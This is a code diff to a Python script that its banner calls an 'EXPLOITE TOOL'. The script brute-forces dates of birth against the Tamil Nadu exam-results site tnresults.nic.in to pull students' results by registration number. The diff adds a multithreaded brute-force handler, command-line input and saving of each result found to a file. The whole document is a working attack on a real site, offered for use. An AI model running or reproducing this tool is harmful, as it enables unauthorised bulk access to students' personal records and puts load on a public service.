@@ -1,8 +1,17 @@
-import requests
+import requests,sys
 from bs4 import BeautifulSoup
+from datetime import datetime,timedelta
+import threading as th
 
+def INDERFACE():
+    print("\n"," WELCOME TO EXPLOITE TOOL"+"\n") 
+    print("Description : Useing this tool we can get information about tnresult, access server with web scraping and pypass cross domite site , wee just need one regno enoghf to find all but secound statement dob pypass by bruteforce attack ")
+    print("\n"+"we need Reg(number or sheet) ,and need bod sheet about student brith year" + "\n")
+
+    print(" Tool created by [.black]","\n")
+    
 def resquest(reg,dob):
-    url = 'https://tnresults.nic.in/wrfexrcd.asp'
+    url = 'https://tnresults.nic.in/wrfexrcd.asp' # CHECK URLPATH TO CORRECT SITE AATTACK
     header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, image/avif, image/webp,image/apng,*/*;q=0.8,application/signed-exchange; v=b3;q=0.7' ,
 'Accept-Encoding': 'gzip, deflate, br',
 'Accept-Language': 'en-IN, en-GB;q=0.9,en-US;q=0.8,en;q=0.7' ,
@@ -25,7 +34,8 @@ def resquest(reg,dob):
     responce = requests.post(url,headers=header,data=payload)
     return responce
 
-from datetime import datetime,timedelta
+_Result=[]
+_Bruter=[]
 
 def render_day(year):    
     date = datetime.strptime(f"01/01/{year}","%d/%m/%Y")
@@ -54,7 +64,7 @@ def datasheet(path):# this method enpack data , txt to array
         return data
 
 def engage_reg(text):
-    info = input(text).split(",")
+    info = text.split(",")
     data=[]
     
     if str(info[0][-4:]) == '.txt':
@@ -65,11 +75,15 @@ def engage_reg(text):
         return data
         
 def engage_dob(text):
-     years=input(text).split(',')
+     years=text.split(',')
      dates=[]
      data=[]
      if  str(years[0][-4:]) == '.txt':
-        return datasheet(str(years[0])) 
+        return datasheet(str(years[0]))
+     elif len(years[0]) ==10:
+         for year in years:
+             dates.append(year)
+         return dates
      else:
          for year in years:
                 for date in render_day(year):
@@ -77,45 +91,75 @@ def engage_dob(text):
          for day in data:
              dates.append(modify(day))
          return dates
+         
+def OUTPUT(student,date,content):
+    with open(f"result[{student}].txt","w") as file:
+        file.write(f" {student} || {date} "+"\n")
+        file.write(str(content)+"\n"+"\n")
+        file.close()
+        _Result.append(str(content))
 
-
-
-print(" WELCOME TO EXPLOITE TOOL"+"\n") 
-print("Description : Useing this tool we can get information about tnresult, access server with web scraping and pypass cross domite site , wee just need one regno enoghf to find all but secound statement dob pypass by bruteforce attack ")
-print("\n"+"we need Reg(number or sheet) ,and need bod sheet about student brith year" + "\n")
-
+def drive_data(list):
+    data=[]
+    measure= str(len(list)/10).split('.')
     
-Regno = engage_reg("Regno -> ")
-Dob=engage_dob("Dob  -> ")
-
-
-print("\n",Regno)
-print("\n",Dob)
-
-if input("\n"+"./Start : ") == "":
+    for i in range(int(measure[0])):
+        data.append(  list[int(f'{i}0') : (int(f'{i}0') +10)])
+    if not measure[1] ==0:
+        set= list[-int(measure[1]):]
+        data.append(set)
+        
+    return data
+                
+def Bruter(ID,DOB,name):
     regT=0
     dobT=0
-    for reg in Regno: #User
+    
+    for student in ID: #User
         regT = regT +1
-        per = len(Dob)
+        per = len(DOB)
         
-        for dob in Dob: #date
+        for date in DOB: #date
             dobT = dobT+1
             per = per-1
-            package = resquest(reg,dob)
+            package = resquest(student,date)
             size=str(len(package.content)/1008)[0:4]
             status=package.status_code
             content= BeautifulSoup(package.text,'html.parser').find('div',{'data-role' : 'content'}).text
+           
             if 50 < len(content):
                 print('')
-                print(f"** [acssxx] : [{reg} || {dob}] -> {regT}/{dobT} @!:{status} ^ {size}kb   ")
-                with open(f"result[{reg}].txt","w") as file:
-                    file.write(f" {reg} || {dob} "+"\n")
-                    file.write(str(content)+"\n"+"\n")
-                    file.close()
+                print(f"** [acssxx] : [{student} || {date}] -> {regT}/{dobT} @!:{status} ^ {size}kb   ")
+                OUTPUT(student,date,content)
                 break
-            if 50 >= len(content):
-                print(f"[request] :  {reg} : {dob}  {regT}/{dobT}  attempt:[{per}] @!:{status} ^ ({size}kb) ")
+                
+            elif 50 >= len(content):
+                 print(f"[req] :  {student} || {date}  {regT}/{dobT}  [{per}]@{status}  ^ ({size}kb) ")
+             
+    print(f'[{name}] :: BRUTER FINISH THERE POSSIBILTY ')
+                 
+def INPUT():
+    reg,dob=0,0
+    if  len(sys.argv) >= 2:
+        reg = engage_reg(sys.argv[1])
+        dob = engage_dob(sys.argv[2])
+    
+    else:
+        reg = engage_reg(input("Regno -> "))
+        dob=engage_dob(input("Dob  -> "))
+    return reg,dob
 
-print('')
-print(" :: Succeful engine finish there cominations")        
+def MULTI_HANDLER(ID,DOB):
+    IDs = drive_data(ID)
+    
+    for brute in range(len(IDs)):
+        brute = th.Thread(target=Bruter,args=(IDs[brute],DOB,f'Bruter{brute}',))
+        brute.start()
+        _Bruter.append(brute)
+    
+INDERFACE()
+_ID_, _DOB_ = INPUT()
+MULTI_HANDLER(_ID_, _DOB_)
+
+for result in _Result:
+    print(result)
